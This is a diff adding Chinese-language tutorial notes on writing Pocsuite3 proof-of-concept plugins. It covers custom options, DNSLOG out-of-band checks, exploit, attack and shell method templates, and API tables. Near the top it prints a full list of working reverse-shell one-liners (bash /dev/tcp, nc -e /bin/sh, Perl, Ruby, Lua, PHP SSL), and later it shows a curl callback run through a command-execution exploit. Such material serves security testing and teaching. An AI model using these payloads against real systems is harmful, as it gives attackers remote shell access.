+                      'PHP_SSL': 'php -r \'$ctxt=stream_context_create(["ssl"=>["verify_peer"=>false,"verify_peer_name"=>false]]);while($s=@stream_socket_client("ssl://{0}:{1}",$erno,$erstr,30,STREAM_CLIENT_CONNECT,$ctxt)){{while($l=fgets($s)){{exec($l,$o);$o=implode("\n",$o);$o.="\n";fputs($s,$o);}}}}\'&',
+                      'NC4': 'nc {0} {1} -e /bin/sh',
+                      'BASH3': "bash -c '0<&173-;exec 173<>/dev/tcp/{0}/{1};sh <&173 >&173 2>&173'",
+                      'TELNET2': 'rm -f /tmp/p; mknod /tmp/p p && telnet {0} {1} 0/tmp/p',
+                      'NC5': 'rm -rf /tmp/p;mkfifo /tmp/p||mknod /tmp/p p;nc {0} {1} 0</tmp/p|/bin/sh 1>/tmp/p',
+                      'LUA': 'lua -e "local s=require(\'socket\');local t=assert(s.tcp());t:connect(\'{0}\',{1});while true do local r,x=t:receive();local f=assert(io.popen(r,\'r\'));local b=assert(f:read(\'*a\'));t:send(b);end;f:close();t:close();"',
+                      'PERL_SSL': 'perl -e \'use IO::Socket::SSL;$p=fork;exit,if($p);$c=IO::Socket::SSL->new(PeerAddr=>"{0}:{1}",SSL_verify_mode=>0);while(sysread($c,$i,8192)){{syswrite($c,`$i`);}}\'',
+                      'RUBY2': 'ruby -rsocket -e\'f=TCPSocket.open("{0}",{1}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'',
+                      'RUBY_SSL': 'ruby -rsocket -ropenssl -e \'exit if fork;c=OpenSSL::SSL::SSLSocket.new(TCPSocket.new("{0}","{1}")).connect;while(cmd=c.gets);IO.popen(cmd.to_s,"r"){{|io|c.print io.read}}end\'',
+                      'NCAT_SSL': 'ncat -e /bin/sh --ssl {0} {1}',
+                      '__dict__': <attribute '__dict__' of 'REVERSE_PAYLOAD' objects>,
+                      '__weakref__': <attribute '__weakref__' of 'REVERSE_PAYLOAD' objects>,
+                      '__doc__': None})
+        
+        #使用方式，直接fomart填入ip和端口就返回payload了
+        In [8]: REVERSE_PAYLOAD.BASH.format('127.0.0.1', 6666)
+        Out[8]: "bash -c 'sh -i >& /dev/tcp/127.0.0.1/6666 0>&1'"
+        
+        ```
+
+##### **自定义输入参数的 PoC**
+
+- 如果你需要编写一个可以交互参数的 PoC 文件（例如有的 PoC 脚本需要填写登录信息，或者任意命令执行时执行任意命令），那么可以在 PoC 文件中声明一个 `_options` 方法。一个简单的例子如下：
+
+- ```python
+    def _options(self):
+        o = OrderedDict()
+        o["username"] = OptString('', description='这个poc需要用户登录，请输入登录账号', require=True)
+        o["password"] = OptString('', description='这个poc需要用户密码，请输出用户密码', require=False)
+        return o
+    ```
+
+- POCBase会调用这个函数返回结果赋值给`self.options`。
+
+- 你可以在 `console` 或者 `cli` 模式下调用。
+
+    - 在 console 模式下，Pocsuite3 模仿了 Metasploit 的操作模式，你只需要使用 `set` 命令来设置相应的参数，然后 `run` 或者 `check` 来执行（`attack` 和 `shell` 命令也可以）。
+    - 在 cli 模式下，如上面例子所示，定义了 `username` 和 `password` 两个字段，你可以在参数后面加上 `--username test --password test` 来调用执行，需要注意的是，如果你的参数中包含了空格，用双引号 `"` 来包裹它。
+
+- 和上面类似，如果你想使用自定义的字段，将它定义到 `_options` 方法中，然后返回一个数组。
+
+- Pocsuite3 支持的自定义字段类型如下：
+
+    ```
+    from pocsuite3.api import OptString, OptDict, OptIP, OptPort, OptBool, OptInteger, OptFloat, OptItems
+    ```
+
+    | 字段类型   | 字段描述                                                     | 参数解释                                                     | 相关例子 |
+    | ---------- | ------------------------------------------------------------ | ------------------------------------------------------------ | -------- |
+    | OptString  | 接收字符串类型参数                                           | default: 传入一个默认值 descript: 字段描述，默认为空 require: 是否必须，默认 False |          |
+    | OptDict    | 接收一个字典类型参数，在选择上如果选择 key，调用时会调用对应的 value | default: 传入一个默认值 descript: 字段描述，默认为空 require: 是否必须，默认 False |          |
+    | OptIP      | 接收 IP 类型的字符串                                         | default: 传入一个默认值 descript: 字段描述，默认为空 require: 是否必须，默认 False |          |
+    | OptPort    | 接收端口类型参数                                             | default: 传入一个默认值 descript: 字段描述，默认为空 require: 是否必须，默认 False |          |
+    | OptBool    | 接收布尔类型参数                                             | default: 传入一个默认值 descript: 字段描述，默认为空 require: 是否必须，默认 False |          |
+    | OptInteger | 接收整数类型参数                                             | default: 传入一个默认值 descript: 字段描述，默认为空 require: 是否必须，默认 False |          |
+    | OptFloat   | 接收浮点数类型参数                                           | default: 传入一个默认值 descript: 字段描述，默认为空 require: 是否必须，默认 False |          |
+    | OptItems   | 接收 list 类型参数                                           | default: 传入一个默认值 selectd: 默认选择 descript: 字段描述，默认为空 require: 是否必须，默认 False |          |
+
+    需要注意的是，`console` 模式支持所有的参数类型，`cli` 模式除了`OptDict`、`OptBool`、`OptItems` 类型外都支持。
+
+##### DNSLOG
+
+- CEye()类：
+
+    - ```python
+            def _verify(self):
+                result = {}
+                oob = CEye()
+                #访问dnslog，生成一个独特的子域名，也就是flag。
+                v = oob.build_request(value='')
+                url, flag = v['url'], v['flag']
+                #访问这个独特的连接
+                param = f'curl {url}'
+                res = self._exploit(param)
+                #通过ceye对象查询是否存在这个flag，就可以判定靶机进行了url请求
+                if oob.verify_request(flag):
+                    result['VerifyInfo'] = {}
+                    result['VerifyInfo']['URL'] = self.url
+                    result['VerifyInfo'][param] = res
+                return self.parse_output(result)
+        
+        ```
+
+    - 首次使用会提示输入 [`CEye API key`](http://ceye.io/profile)，验证可用后会保存到 `$HOME/.pocsuiterc` 文件中，除非 token 过期，下次使用不会重复询问，也可使用 `--ceye-token` 参数提供。
+
+    - 
+
+
+##### 其他
+
+值得一提的是，针对有回显的漏洞，只要在 PoC 中实现一个 `_exploit` 方法，就可轻松实现 Pocsuite3 的 `_verify`、`_attack`、`_shell` 三种模式，如下：
+
+```python
+# 重写这个方法
+def _exploit(self, cmd='id'):
+    result = ''
+    res = requests.get(self.url)
+    logger.debug(res.text)
+    result = res.text
+    return result
+
+# 验证漏洞存在
+def _verify(self):
+    result = {}
+    if not self._check():
+        return self.parse_output(result)
+
+    flag = random_str(10)
+    cmd = f'echo {flag}'
+    res = self._exploit(cmd)
+    if flag in res:
+        result['VerifyInfo'] = {}
+        result['VerifyInfo']['URL'] = self.url
+        result['VerifyInfo'][cmd] = res
+    return self.parse_output(result)
+
+def _options(self):
+    o = OrderedDict()
+    o['cmd'] = OptString('id', description='The command to execute')
+    return o
+
+# 从命令行参数获取用户命令，并输出命令执行结果
+def _attack(self):
+    result = {}
+    if not self._check():
+        return self.parse_output(result)
+
+    cmd = self.get_option('cmd')
+    res = self._exploit(cmd)
+    result['VerifyInfo'] = {}
+    result['VerifyInfo']['URL'] = self.url
+    result['VerifyInfo'][cmd] = res
+    return self.parse_output(result)
+
+# 交互 shell 模式
+def _shell(self):
+    return bind_shell(self, '_exploit')
+
+```
+
+##### poc编写规范
+
+- 编写 PoC 的时候，尽量不要使用第三方模块，如果在无法避免的情况下，请在 PoC 的基础信息部分，增加 `install_requires` 字段，按照以下格式填写依赖的模块名。
+
+    - ```python
+        install_requires =[str_item_, str_item, …] # 整个字段的值为 list，每个项为一个依赖模块。
+        ```
+
+    - str_item 格式：`模块名[><=]版本号`，模块名为 pip install 安装时的模块名（请不要填写 import 的模块名）。
+
+    - 如果遇到安装时模块名与调用时的不一致情况，用 `:` 分割开，例如常见的加密算法库 `pycryptodome`，但是调用是以 `from Crypto.Cipher import AES`，此时就需要如下填写：
+
+        - ```
+            install_requires = ['pycryptodome>=3.12.0:Crypto']
+            ```
+
+    - `install_requires` 这个属性存在的意义是方便管理引入的第三方模块，加载 PoC 的时候如果检测到用户没有安装这个模块，可以提示用户安装模块后再继续运行。还有一个场景是可以通过代码解析出该属性然后自动安装相应模块，方便自动化解决依赖。无法用于导入模块，导入请手动 `import` 。
+
+- 编写 PoC 的时候，尽量的使用 Pocsuite3 已经封装的 API 提供的方法，避免自己重复造轮子，对于一些通用方法可以加入到 API，具体参考
+
+    - | 方法                                      | 说明                           |
+        | ----------------------------------------- | ------------------------------ |
+        | from pocsuite3.api import logger          | 日志记录，比如logger.log(info) |
+        | from pocsuite3.api import requests        | 请求类，用法同 requests        |
+        | from pocsuite3.api import Seebug          | Seebug api 调用                |
+        | from pocsuite3.api import ZoomEye         | ZoomEye api 调用               |
+        | from pocsuite3.api import Shodan          | Shodan api 调用                |
+        | from pocsuite3.api import Fofa            | Fofa api 调用                  |
+        | from pocsuite3.api import Quake           | Quake api 调用                 |
+        | from pocsuite3.api import Hunter          | Hunter api 调用                |
+        | from pocsuite3.api import Censys          | Censys api 调用                |
+        | from pocsuite3.api import CEye            | CEye api 调用                  |
+        | from pocsuite3.api import Interactsh      | Interactsh api 调用            |
+        | from pocsuite3.api import crawl           | 简单爬虫功能                   |
+        | from pocsuite3.api import PHTTPServer     | Http 服务功能                  |
+        | from pocsuite3.api import REVERSE_PAYLOAD | 反向连接 shell payload         |
+        | from pocsuite3.api import get_results     | 获取结果                       |
